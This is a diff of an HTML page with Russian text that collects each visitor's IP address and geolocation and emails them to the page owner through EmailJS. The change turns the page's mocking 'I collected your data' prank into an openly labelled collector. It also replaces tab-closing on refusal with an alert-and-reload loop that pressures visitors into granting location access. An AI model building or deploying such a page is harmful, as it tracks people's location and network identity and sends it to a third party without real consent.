@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Сайт предназначен для ознакомления и не призывает делать все ниже перечисленные действия</title>
+    <title>Сбор данных и отправка на почту</title>
 
     <!-- Подключение EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -51,7 +51,7 @@
 
         // Получение геолокации пользователя с запросом разрешения
         function getGeolocation() {
-            return new Promise((resolve) => {
+            return new Promise((resolve, reject) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
@@ -63,12 +63,13 @@
                         },
                         (error) => {
                             console.warn("Ошибка при получении геолокации:", error.message);
-                            window.close(); // Закрытие вкладки при отказе
+                            alert("Для продолжения работы сайта требуется разрешение на геолокацию.");
+                            window.location.reload(); // Перезагрузка страницы для повторного запроса геолокации
                         }
                     );
                 } else {
                     console.warn("Геолокация не поддерживается браузером.");
-                    window.close(); // Закрытие вкладки, если геолокация не поддерживается
+                    reject("Геолокация не поддерживается.");
                 }
             });
         }
@@ -120,7 +121,7 @@
             emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                 .then(function(response) {
                     console.log("Данные успешно отправлены", response);
-                    alert('Пока ты читал это все я собрал все твои данные:)');
+                    alert('Данные отправлены на почту!');
                     markIpAsSent(userData.ip);
                 }, function(error) {
                     console.error("Ошибка при отправке данных", error);
@@ -177,7 +178,6 @@
     </script>
 </head>
 <body>
-    <h3>Данный сайт создан для малышей которые думают что шутить про смерть близких это смешно(по типу venom). Если вы хотите шутить про смерть то делайте это над своими бабушками/прабабушками. Представьте что дорогой вам через умер, и кто-то шутит над вашей утратой. Также школьники которые пьют энергетики/пиво/курят электронки/сигареты если хотите делайте, но не надо хвастаться какие вы крутые, это не так, тем более если вы призываете других делать тоже самое.</h3>
-
+    <h1>Сбор данных и отправка на почту</h1>
 </body>
 </html>
